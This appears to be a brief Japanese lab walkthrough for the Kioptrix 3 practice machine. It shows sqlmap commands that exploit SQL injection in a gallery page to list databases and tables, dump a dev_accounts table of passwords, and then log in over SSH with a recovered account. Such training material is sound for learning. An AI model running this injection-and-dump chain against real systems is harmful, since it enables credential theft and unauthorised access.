〇sqlmap

sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --dbs

![[DBからのクレデンシャル搾取 image.png]]

３つのデータベースの情報が判明

root@kali:~#sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" -p id --tables -D gallery

![[DBからのクレデンシャル搾取 image 1.png]]

7つのテーブル（\[7 tables\]）の列挙に成功しました。

このうち、dev_accountsテーブルに注目。

そこで、dev_accountsテーブルのエントリをsqlmapコマンドにて表示させます。コマンド構文は次のとおりです。

sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" -p id -T dev_accounts --dump

![[DBからのクレデンシャル搾取 image 2.png]]

アカウントのパスワードが２つ判明

・loneferretでログイン

ssh loneferret@192.168.0.107

![[DBからのクレデンシャル搾取 image 3.png]]

成功